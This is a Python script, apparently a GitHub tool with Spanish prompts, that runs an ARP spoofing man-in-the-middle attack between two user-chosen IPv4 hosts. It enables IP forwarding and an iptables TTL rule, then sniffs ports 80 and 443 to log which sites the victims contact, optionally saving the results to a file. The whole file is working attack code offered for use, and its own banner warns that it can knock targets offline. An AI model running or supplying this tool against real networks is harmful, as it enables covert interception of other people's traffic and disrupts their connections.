#!/usr/bin/env -S python3
import threading
from scapy.all import *
import re
from socket import gethostbyaddr,herror
from platform import system
from subprocess import check_output
from colorama import init,Fore

init()

logo = '''
\033[0;40;35m
 ▗▄▄▖ ▗▄▖ ▗▄▄▖ ▗▖ ▗▖▗▄▄▄▖ ▗▄▄▖ ▗▄▖ 
▐▌   ▐▌ ▐▌▐▌ ▐▌▐▌ ▐▌▐▌   ▐▌   ▐▌ ▐▌
 ▝▀▚▖▐▛▀▜▌▐▛▀▚▖▐▌ ▐▌▐▛▀▀▘ ▝▀▚▖▐▌ ▐▌
▗▄▄▞▘▐▌ ▐▌▐▙▄▞▘▝▚▄▞▘▐▙▄▄▖▗▄▄▞▘▝▚▄▞▘


\033[0;40;31m[+] por Urb@n --> https://github.com/Urban20                                      

\033[33m[X] ADVERTENCIA\nesta herramienta puede afectar la conexion de la maquina objetivo al inteceptar paquetes, dejandola sin internet o con una señal debil mientras dure el ataque
'''
ejecutando = True

def guardar(data):
   try:
      with open(f'{n_arch}.txt','a') as arch:
         arch.write(f'\r\n{data}\r\n')
   except Exception as e:
      print(f'\n\033[0;40;31m[-] hubo un error durante el guardado de paquetes >> {e}\033[0m\n')
      
def ataque(ip1,ip2): 
   global ejecutando
  
   try:
      arp_mitm(ip1,ip2)#type:ignore

   except Exception as e:
      print(f'\n\033[0;40;31m[-] ocurrio un error durante el ataque >> {e}\033[0m\n')
      ejecutando = False
      exit(1)
      
def informacion(paquete):
   try:
      ip_http = re.search(r'(\d+\.\d+\.\d+\.\d+):https?',str(paquete)).group(1).strip()
      ip_dts = re.search(r'TCP (\d+\.\d+\.\d+\.\d+):\d+ >',str(paquete)).group(1).strip()
      #ip_dst --> ip destinatario 0
      #ip_http --> ip del sitio web 1
      return (ip_dts,ip_http)
   except AttributeError:
      pass

def sniffing():


   while ejecutando:
      try:
         func_sn = sniff(timeout=1,filter='tcp and ( port 80 or port 443 )')
         for x in range(len(func_sn) - 1):
            try:
               #retorna la ip del sitio web
               pqt = informacion(func_sn[x])[1]
               #retorna la ip del destinatario
               p1 = informacion(func_sn[x])[0]

               info = f'[+] host > {gethostbyaddr(pqt)[0]}\n[+] ip numerica > {pqt}\n[+] ipv4 implicado > {p1}'

               if p1 in ipv4s:
                  print(Fore.WHITE+f'\r\n{info}\r\n')

            except herror:
               info = f'[+] ip numerica > {pqt}\n[+] ipv4 implicado > {p1}'
               if p1 in ipv4s:
                  print(Fore.WHITE+f'\r\n{info}\n\r')
            finally:
               if guardado and p1 in ipv4s:
                  guardar(data=info)

      except (TypeError,ValueError): pass

      except Exception as e: print(f'\n\033[0;40;31m[+] error > {e}\n')  
      
      

def ejecucion(maq1,maq2):
   
   threading.Thread(target=ataque,args=(maq1,maq2)).start()
   threading.Thread(target=sniffing).start()
   
   

if __name__ == '__main__':
   ipv4s = []
   print(logo)
   guardado = False
   if system() == 'Linux':
      if check_output('whoami',text=True).strip() == 'root': 
         maq1 = str(input(Fore.WHITE+'[#] maquina A (ipv4) >> ')).strip()
         maq2 = str(input(Fore.WHITE+'[#] maquina B (ipv4) >> ')).strip()
         ipv4s.append(maq1)
         ipv4s.append(maq2)
         preg = str(input('[0] para guardar info en .txt >> ')).strip()

         if preg == '0':
            guardado = True
            n_arch = str(input('[#] nombre que tendra el archivo >> ')).strip()

         print('\033[0m')
         for x in ['sysctl net.ipv4.conf.all.send_redirects=0',
            'sysctl net.ipv4.ip_forward=1',
            'iptables -t mangle -A PREROUTING -j TTL --ttl-inc 1']:

            if subprocess.run(x,shell=True).returncode != 0:
               print(f'\n[+] no se pudo configurar correctamente el comando {x}\n')
               
         print('\n\033[0;32miniciando ataque ...\n')
         ejecucion(maq1,maq2)
      else:
         print('\n\033[0;40;31m[+] no soy root\n')
   else:
      print('\n\033[0;40;31m[+] sistema operativo incompatible\n')
      input()